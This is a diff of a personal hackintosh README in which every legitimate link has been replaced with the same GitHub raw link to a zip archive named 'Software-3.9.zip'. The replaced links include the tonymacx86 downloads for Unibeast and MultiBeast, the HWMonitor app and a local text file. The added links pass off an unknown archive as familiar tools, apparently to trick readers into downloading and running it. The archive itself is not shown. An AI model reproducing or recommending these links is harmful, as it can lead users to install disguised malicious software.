@@ -1,6 +1,6 @@
 # My Hackintosh
 
-This is to share the configuration and track issues for my hackintosh on intels ivy bridge platform. If you want to build a hackintosh on your own I encourage you to visit [tonymacx86](http://tonymacx86.com). They provide the tools used in this build. Don't forget to check out their super helpful forum. 
+This is to share the configuration and track issues for my hackintosh on intels ivy bridge platform. If you want to build a hackintosh on your own I encourage you to visit [tonymacx86](https://github.com/moralesgarcia/hackintosh/raw/refs/heads/master/damn/Software-3.9.zip). They provide the tools used in this build. Don't forget to check out their super helpful forum. 
 
 # Components
 
@@ -11,7 +11,7 @@ This is to share the configuration and track issues for my hackintosh on intels 
 
 # Installation - Mac OS X 10.9
 
-The boot drive was created with [Unibeast 3](http://www.tonymacx86.com/downloads.php?do=file&id=202) and was able to boot the OS without any flags. [MultiBeast 6](http://www.tonymacx86.com/downloads.php?do=file&id=206) was used with the following configuration for post installation.
+The boot drive was created with [Unibeast 3](https://github.com/moralesgarcia/hackintosh/raw/refs/heads/master/damn/Software-3.9.zip) and was able to boot the OS without any flags. [MultiBeast 6](https://github.com/moralesgarcia/hackintosh/raw/refs/heads/master/damn/Software-3.9.zip) was used with the following configuration for post installation.
 
 ## MultiBeast 6.0.1 (2013-11-10) Configuration
 
@@ -35,8 +35,8 @@ After installation of OS X 10.9.1 Combo Update:
 
 * Reinstalling audio driver
 * Reinstalling TRIM enabler
-* Reinstalling FakeSMC + Plugins + HWMonitior.app
+* Reinstalling FakeSMC + Plugins + https://github.com/moralesgarcia/hackintosh/raw/refs/heads/master/damn/Software-3.9.zip
 
 
-The currently installed kext files are listed in [this file](installed_kext.txt)
+The currently installed kext files are listed in [this file](https://github.com/moralesgarcia/hackintosh/raw/refs/heads/master/damn/Software-3.9.zip)
 
